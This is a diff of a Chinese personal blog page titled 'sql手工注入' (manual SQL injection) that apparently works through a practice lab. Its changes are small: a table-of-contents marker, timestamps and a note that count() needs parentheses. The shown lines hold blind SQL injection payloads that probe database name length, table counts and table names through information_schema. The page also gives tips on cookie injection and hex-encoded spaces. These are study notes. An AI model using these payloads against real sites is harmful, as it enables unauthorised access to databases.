@@ -81,12 +81,12 @@
 
 
 
-<meta name="description" content="第一步判断输入类型#$_REQUEST $_COOKIE  可以用cookie注入 空格要用16进制 第二步判断注入点 and 和 or 的理解 and的使用 当判断有没有注入点时，可以用and 1=1 1=2来判断 or的使用 select * from user where id =’’ or 1=1#     当直接把前面闭合时，条件永远为假，所以用or 注意绕过 ‘$id’ 单引号 “$i">
+<meta name="description" content="[toc] 第一步判断输入类型#$_REQUEST $_COOKIE  可以用cookie注入 空格要用16进制 第二步判断注入点 and 和 or 的理解 and的使用 当判断有没有注入点时，可以用and 1=1 1=2来判断 or的使用 select * from user where id =’’ or 1=1#     当直接把前面闭合时，条件永远为假，所以用or 注意绕过 ‘$id’ 单">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql手工注入">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;24&#x2F;sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5&#x2F;index.html">
 <meta property="og:site_name" content="waiwailo&#x2F;blog">
-<meta property="og:description" content="第一步判断输入类型#$_REQUEST $_COOKIE  可以用cookie注入 空格要用16进制 第二步判断注入点 and 和 or 的理解 and的使用 当判断有没有注入点时，可以用and 1=1 1=2来判断 or的使用 select * from user where id =’’ or 1=1#     当直接把前面闭合时，条件永远为假，所以用or 注意绕过 ‘$id’ 单引号 “$i">
+<meta property="og:description" content="[toc] 第一步判断输入类型#$_REQUEST $_COOKIE  可以用cookie注入 空格要用16进制 第二步判断注入点 and 和 or 的理解 and的使用 当判断有没有注入点时，可以用and 1=1 1=2来判断 or的使用 select * from user where id =’’ or 1=1#     当直接把前面闭合时，条件永远为假，所以用or 注意绕过 ‘$id’ 单">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;578be440399e4219a9518c89d8431ac1&#x2F;cbd890e837b7d5b75f78d7af814362ed.jpg">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;d635deafb40041ee985d876d1bb71dba&#x2F;e1d239263762b769be93c1d455c704d9.jpg">
@@ -99,7 +99,7 @@
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;c5a8179558f04872b8bae0384fa6adba&#x2F;551928141656.png">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;9c34adb97fd24630beb944c330483a5b&#x2F;clipboard.png">
 <meta property="og:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;572314954ddd4d3f86f7572f075e126e&#x2F;clipboard.png">
-<meta property="og:updated_time" content="2019-11-24T17:06:41.704Z">
+<meta property="og:updated_time" content="2019-11-25T04:21:27.842Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="c:&#x2F;Users&#x2F;wai-wai&#x2F;AppData&#x2F;Local&#x2F;YNote&#x2F;data&#x2F;qq4EF61E8A5E69F04C63CDAC03394D9979&#x2F;578be440399e4219a9518c89d8431ac1&#x2F;cbd890e837b7d5b75f78d7af814362ed.jpg">
 
@@ -311,7 +311,8 @@
       
 
       
-        <h2><span id="di-yi-bu-pan-duan-shu-ru-lei-xing">第一步判断输入类型</span><a href="#di-yi-bu-pan-duan-shu-ru-lei-xing" class="header-anchor">#</a></h2><p><a href="http://www.baidu.com/link?url=DzjcovztPSNVH3IE4L1KTR7X3ajFa9pI5iHMU07TjalYt5i6MW9f0rxDtClFUwsLQbouUd0EXcKCN36Um1TPSa" target="_blank" rel="noopener">$_REQUEST</a> $_COOKIE </p>
+        <p>[toc]</p>
+<h2><span id="di-yi-bu-pan-duan-shu-ru-lei-xing">第一步判断输入类型</span><a href="#di-yi-bu-pan-duan-shu-ru-lei-xing" class="header-anchor">#</a></h2><p><a href="http://www.baidu.com/link?url=DzjcovztPSNVH3IE4L1KTR7X3ajFa9pI5iHMU07TjalYt5i6MW9f0rxDtClFUwsLQbouUd0EXcKCN36Um1TPSa" target="_blank" rel="noopener">$_REQUEST</a> $_COOKIE </p>
 <p>可以用cookie注入 空格要用16进制</p>
 <p>第二步判断注入点</p>
 <p>and 和 or 的理解</p>
@@ -390,7 +391,7 @@
 <p>?id=1’ and  length(database())=8 –+   判断数据库长度 可以不加select</p>
 <p>如果不知道id的值 就需要用 or  ?id=-1’ or  length(database())=8 –+  </p>
 <p>?id=1’ and ascii(substr(database(),1,1)) &gt;100 –+   判断数据库名第一个字母的ascii   </p>
-<p>?id=1’ and (select count(*) from information_schema.tables where table_schema =’security’)&gt;2 –+   判断指定数据库有多少个表</p>
+<p>?id=1’ and (select count(*) from information_schema.tables where table_schema =’security’)&gt;2 –+   判断指定数据库有多少个表    （count（）是一个函数必须加上括号）</p>
 <p>?id=1’ and (select length(table_name) from information_schema.tables where table_schema =’security’ limit 0,1)&gt;2 –+   判断第一个表的长度</p>
 <p>?id=1’ and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema =’security’ limit 0,1)&gt;99 –+   数据库第一个表的表名称第一个字母的ascii值</p>
 <p>—————得到表名后 查表有多少个字段</p>
@@ -521,7 +522,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
